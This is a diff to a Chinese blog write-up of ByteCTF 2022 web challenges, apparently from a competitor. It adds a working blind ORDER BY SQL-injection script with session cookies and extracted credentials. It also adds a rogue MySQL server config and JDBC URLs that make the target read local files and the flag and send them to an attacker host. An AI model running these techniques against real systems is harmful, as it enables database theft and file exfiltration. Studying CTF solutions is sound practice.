@@ -6,7 +6,7 @@ tags: [ctf, security]
 description: ByteCTF2022 第9名 打的还不错的一场比赛
 ---
 
-比赛时主要是做了ctf_cloud和typing_game两个题目，其中typing_game还是非预期解了，整体Web只差datamanager就AK了，不过`microservices`这道题目是大佬们出的，自己其实也没有去复现过。正好比赛结束还可以开靶机，可以抽空复现一下难题。
+比赛时主要是做了ctf_cloud和typing_game两个题目，其中typing_game还是非预期解了，整体Web只差datamanager就AK了，不过`microservices`这道题目是学长们解出的，自己其实也没有去复现过。正好比赛结束还可以开靶机，可以抽空复现一下难题。
 
 ## easy_grafana
 
@@ -106,7 +106,7 @@ res = uploadFile("https://eea8061294ea1d51ca4df400f54e3413.2022.capturetheflag.f
 print(res.status_code, res.text)
 ```
 
-```
+```json
 {
   "name": "pkg",
   "version": "1.0.0",
@@ -126,7 +126,7 @@ print(res.status_code, res.text)
 
 POST的参数
 
-```
+```json
 {"dependencies":{"pkg": "file:./public/uploads"}}
 ```
 
@@ -139,10 +139,9 @@ POST的参数
 
 ## typing_game
 
-### 四字符命令注入弹Shell
+> 我是练习时长两年半的nodejs菜鸟，欢迎来玩我写的小游戏
 
-> 题目描述：
-我是练习时长两年半的nodejs菜鸟，欢迎来玩我写的小游戏
+### 四字符命令注入弹Shell
 
 这个题目当时出的队伍不多只有11个，不过我的做法是非预期的，用的是四字符命令注入弹shell。
 
@@ -214,7 +213,7 @@ s.get(baseurl+"sh g")
 
 可能也许这也是出题人预期的一种吧不然为啥是四字符呢，假如改成3字符唯一的做法就是xss带出回显然后执行`env`拿到flag了，不过这好像没有特别大的意义吧。
 
-### XSS带出命令执行回显
+### CSS Leak通关游戏+ XSS带出命令执行回显
 
 审计js代码，发现游戏结束的页面有XSS点，将用户传入的参数name通过innerHTML渲染在页面上。
 
@@ -270,15 +269,154 @@ addEventListener("hashchange",e=>{
 </body>
 ```
 
+这里还有一个另外的方法，可以不需要用循环遍历来猜单词，而是可以知道随机到的`RandomWord`是什么。
+
+在css里接收`color`参数，这里可以进行CSS注入，通过CSS注入来将`RandomWord`带出，再改变hash值输入，来达到预测的效果，假设这里使用随机字符串的话就必须用CSS注入这个做法啦。
+
+CSS注入可以参考文件`<https://book.hacktricks.xyz/pentesting-web/xs-search/css-injection>`
+
 ![图 1](https://s2.loli.net/2022/09/28/9EIgxCoPdep3bfw.png)  
 
 ## microservice
 
-还在复现（
+> Hackers stole part of the source code of a microservice that was still in development
 
 ## datamanager
 
-还在复现（
+> make database great again
+
+在`/dashboard?id=`这个参数有sql注入，`/dashboard?order=9`不会500而`/dashboard?order=10`会500,那么到此我们就可以猜测sql语句为`select xxx from xxx order by ${id}`。
+
+不过经过Fuzz,题目过滤了很多关键词。
+
+```
+union ascii substr hex sleep benchmark mid left right = , ' " > < ; 
+```
+
+上面这些关键词都被过滤了。这里可以拼接`and case when then`的sql语句来进行order by注入。order by注入可以参考文章`https://www.secpulse.com/archives/57197.html`。
+
+我是学习了W&M的exp进行的复现，发现原来可以用`string.printable[]`来表示可见字符。
+
+`order=id and case when (database() like PAYLOAD) then 1 else 9223372036854775807%2B1 end`例如这条payload,在对应位置便利可见字符的16进制来模糊匹配，如果when条件为true那么按id排序正常200返回，否则会执行`9223372036854775807%+1`报错而500。
+
+```python
+from sre_constants import SUCCESS
+import requests
+requests = requests.Session()
+import string
+
+proxies = {}
+import warnings
+warnings.filterwarnings("ignore")
+
+headers = {
+    "Cookie": "__t_id=7267900aaba9b607c88b9639ae26899a; JSESSIONID=C1032349BC4000AE184AD31889B5B0F3",
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
+
+}
+
+#database() == datamanager
+url = "<https://b9cf435899298a5ccde1a16acc13260e.2022.capturetheflag.fun/dashboard?order=id> and case when (database() like PAYLOAD) then 1 else 9223372036854775807%2B1 end"
+
+#tables : source,users
+url = "<https://b9cf435899298a5ccde1a16acc13260e.2022.capturetheflag.fun/dashboard?order=id> and case when ((select group_concat(table_name) from information_schema.tables where table_schema like 0x646174616d616e61676572) like PAYLOAD) then 1 else 9223372036854775807%2B1 end"
+
+#columns from users: current\\_connections,total\\_connections,user,id,n4me,pas$word
+url = "<https://b9cf435899298a5ccde1a16acc13260e.2022.capturetheflag.fun/dashboard?order=id> and case when ((select group_concat(column_name) from information_schema.columns where table_name like 0x7573657273) like PAYLOAD) then 1 else 9223372036854775807%2B1 end"
+
+#n4me from users: ctf,...
+url = "<https://b9cf435899298a5ccde1a16acc13260e.2022.capturetheflag.fun/dashboard?order=id> and case when ((select group_concat(n4me) from users) like PAYLOAD) then 1 else 9223372036854775807%2B1 end"
+
+#pas$word from users: ctf@BvteDaNceS3cRet,...
+url = "<https://b9cf435899298a5ccde1a16acc13260e.2022.capturetheflag.fun/dashboard?order=id> and case when ((select group_concat(pas$word) from users) like PAYLOAD) then 1 else 9223372036854775807%2B1 end"
+
+def main():
+    flag = ""
+    while 1:
+        success = False
+        for i in string.printable[:-6]:
+            if i in "_%[]":
+                i = "\\\\"+i
+            payload = "0x"
+            for item in flag:
+                payload += "%02x" % ord(item)
+            for item in i:
+                payload += "%02x" % ord(item)
+            payload += "25"
+            #print(payload)
+            r = requests.get(url.replace("PAYLOAD",payload),proxies=proxies,headers=headers,verify=False,timeout=3)
+            #if "SORRY!" not in r.text:
+            if r.status_code == 200:
+                flag += i
+                print(flag)
+                success = True
+                break
+        if success:
+            continue
+        else:
+            print("failed",flag)
+            raise Exception("failed")
+
+if __name__ == "__main__":
+    main()
+```
+
+拿到账号密码`ctf/ctf@BvteDaNceS3cRet`后登陆。
+
+发现可以控制JDBC的参数，因为接口传一个叫`url`的参数来连接数据库。这里可以利用仓库`<https://github.com/rmb122/rogue_mysql_server>`来构造恶意mysql server,从而实现任意文件读取，同时还可以使用`file://`协议来读取目录，从而找到flag。
+
+配置文件
+
+```
+host: 0.0.0.0
+port: 3306
+# 监听的 IP 和端口.
+
+version_string: "10.4.13-MariaDB-log"
+# 客户端得到的服务端版本信息.
+
+file_list: ["/etc/passwd", "C:/boot.ini"]
+save_path: ./loot
+# 需要读取的文件, 注意这个不意味着一次性读取列表中的所有文件 (很多客户端实现不支持这种操作).
+# 而是客户端每执行一次语句, 按照列表中的顺序读取一个文件, 并保存到 `save_path` 文件夹中.
+
+always_read: true
+# 如果为 true, 那么不管客户端是否标记自己支持 LOAD DATA LOCAL, 都会尝试去读取文件, 否则会根据客户端的标记来决定是否读取, 避免客户端请求不同步.
+
+from_database_name: true
+# 如果为 true, 将会从客户端设定中的数据库名称中提取要读取的文件.
+# 例如链接串为 `jdbc:mysql://localhost:3306/%2fetc%2fhosts?allowLoadLocalInfile=true`.
+# 将会从客户端读取 `/etc/hosts` 而不会遵循 `file_list` 中的设置.
+
+max_file_size: 0
+# 读取文件的最大大小 (单位 byte), 超过这个大小的文件内容将会被忽略. 如果 <= 0, 代表没有限制.
+
+auth: false
+users:
+  - root: root
+  - root: password
+# 对应是否开启验证, 如果为 `false`, 那么不管输什么密码或者不输入密码都可以登录.
+# 如果为 `true`, 则需要帐号密码匹配下面的设置的帐号密码中的一条.
+
+jdbc_exploit: false
+always_exploit: false
+ysoserial_command:
+  cc4: ["java", "-jar", "ysoserial-0.0.6-SNAPSHOT-all.jar", "CommonsCollections4", 'touch /tmp/cc4']
+  cc7: ["java", "-jar", "ysoserial-0.0.6-SNAPSHOT-all.jar", "CommonsCollections7", 'touch /tmp/cc7']
+# 见 `jdbc 利用相关` 一节
+```
+
+```
+列 / 目录, url参数为`jdbc:mysql://vps:3306/file%3A%2F%2F%2F?allowLoadLocalInfile=true&allowUrlInLocalInfile=true`
+```
+![图 1](https://s2.loli.net/2022/09/29/rEapBNHgy5kOYAo.png) 
+
+```
+读Flag文件, url参数为`jdbc:mysql://vps:3306/file%3A%2F%2F%2Fvery_Str4nge_NamE_of_flag?allowLoadLocalInfile=true&allowUrlInLocalInfile=true`
+```
+
+![图 2](https://s2.loli.net/2022/09/29/mWULaI7zZHb6SGF.png)  
+
 
 ## easy_groovy
 
